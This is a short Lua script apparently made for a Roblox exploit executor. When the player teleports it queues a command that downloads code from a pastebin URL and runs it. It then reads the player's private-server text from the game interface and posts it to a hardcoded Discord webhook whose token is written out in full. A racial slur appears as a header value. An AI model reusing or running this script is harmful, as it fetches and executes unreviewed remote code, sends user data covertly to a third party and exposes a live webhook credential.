game.Players.LocalPlayer.OnTeleport:Connect(function(state)
    if state == Enum.TeleportState.Started then
        (syn and syn.queue_on_teleport or queue_on_teleport)("loadstring(game:HttpGet('https://pastebin.com/raw/9yFKFd6i'))()")
    end
end)
if game:IsLoaded() then
    wait(15)
local cock = game.Players.LocalPlayer.PlayerGui.Main.private.Text
local Response = syn.request({
        Url = 'https://discord.com/api/webhooks/935303027181649992/Tw055ZwR4Y0whxUdV1GoaBgcB3h2ixumdekr2yJ9SdvxPxDuzN4zLAcwXlhdS7yPKMA-',
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json",
            ['title'] = "NIGZ"
        },
        Body = game:GetService("HttpService"):JSONEncode({["content"] = "New private server! "..game.Players.LocalPlayer.PlayerGui.Main.private.Text})
    })
end
